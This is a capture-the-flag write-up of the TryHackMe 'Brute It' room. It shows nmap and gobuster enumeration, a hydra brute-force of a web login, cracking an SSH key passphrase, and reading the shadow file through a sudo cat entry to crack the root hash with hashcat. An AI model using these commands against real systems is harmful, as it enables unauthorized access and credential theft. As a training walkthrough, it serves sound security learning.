---
title: "TryHackMe - Brute It"
author: Nasrallah
description: ""
date: 2022-12-09 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, easy, hydra, bruteforce, hashcat, crack]
img_path: /assets/img/tryhackme/bruteit
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [Brute It](https://tryhackme.com/room/bruteit) from [TryHackMe](https://tryhackme.com). This machine is running a webserver where we find a login page that we brute force and find a user's password, Once we're logged in we find an ssh private key that we use to gain foothold. After that we exploit a sudo entry to read the shadow file and crack the root's hash to get his password thus getting root shell.

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
map scan report for 10.10.52.106
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are two open ports, 22 running OpenSSH and 80 running Apache http web server.

### Web

Let's navigate to the web page.

![](1.png)

We see the default Apache 2 page, nothing really useful.

### Gobuster

Let's run a directory scan.

```terminal
└──╼ $ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.52.106/                                                  
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.52.106/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/11/06 07:43:02 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/admin                (Status: 301) [Size: 312] [--> http://10.10.52.106/admin/]
/index.html           (Status: 200) [Size: 10918]                               
/server-status        (Status: 403) [Size: 277]                                 
                                                                                
===============================================================

```

We found a page called **/admin**, let's see what's there.

![](2.png)

It's a login page, and if we check the source code we find an interesting comment.

![](3.png)

We found the username but no password so let's brute force the login page with `hydra` using the following command:

### Hydra

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.52.106 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid"
```

![](4.png)

We got the password, let's login.

![](5.png)

## **Foothold**

We found john ssh private key, let's copy it to our machine, give it the right permissions and connect with it.

![](6.png)

The private key is protected with a password so we use `ssh2john` to extract the hash and crack it using `john`.

Let's reconnect.

![](7.png)

## **Privilege Escalation**

Let's check our current privileges with `sudo -l`

```bash
john@bruteit:~$ sudo -l
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
```

We can run cat as root, so let's read the shadow file.

![](8.png)

Let's copy root's hash to a file and crack it with `hashcat`. 

```bash
└──╼ $ cat roothash.txt
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.
```

We use the following command to crack the hash.

```bash
hashcat -m 1800 roothash.txt /usr/share/wordlists/rockyou.txt --user
```

![](9.png)

We got the root's password, let's swith to him with the command `su -`

```terminal
john@bruteit:~$ su -
Password: 
root@bruteit:~# id
uid=0(root) gid=0(root) groups=0(root)
root@bruteit:~#
```

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
